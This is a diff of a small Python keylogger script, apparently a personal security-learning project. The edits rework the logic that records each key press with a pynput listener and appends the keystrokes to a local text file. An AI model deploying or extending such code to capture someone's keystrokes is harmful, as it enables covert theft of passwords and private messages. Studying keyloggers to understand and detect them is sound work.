@@ -1,6 +1,6 @@
 ##########################
 # import modules | packages | libraries
-###########################
+##########################
 
 # email package to read, write, and send simple email 
 # messages, as well as more complex MIME messages
@@ -29,35 +29,22 @@ import platform
 import time
 import os
 
-##########################
-# keylogger logic
-##########################
-
-# define logger save to path
+# define logger save path
 keys_information = "key_log.txt" 
-file_path = "/Users/amartin/Desktop/cyber_Projects/keylogger/key_log.txt"
+file_path = "/Users/amartin/Desktop/cyber_Projects/keylogger/"
 
-cont = 0
-keys = []
+keys =[]
 
 def on_press(key):
     global keys, cont
+    print(key)
     keys.append(key)
-    
-    cont += 1
-    if cont >= 1:
-        cont = 0
-        write_file(keys)
-        keys = []
+    write_file(keys)
 
 def write_file(keys):
-    with open(file_path, "a") as f:
-        f.write()
+    with open(file_path + keys_information, "a") as f:
+        f.write(str(keys))
         f.close()
 
 with Listener(on_press=on_press) as listener:
     listener.join()
-
-##########################
-#
-##########################
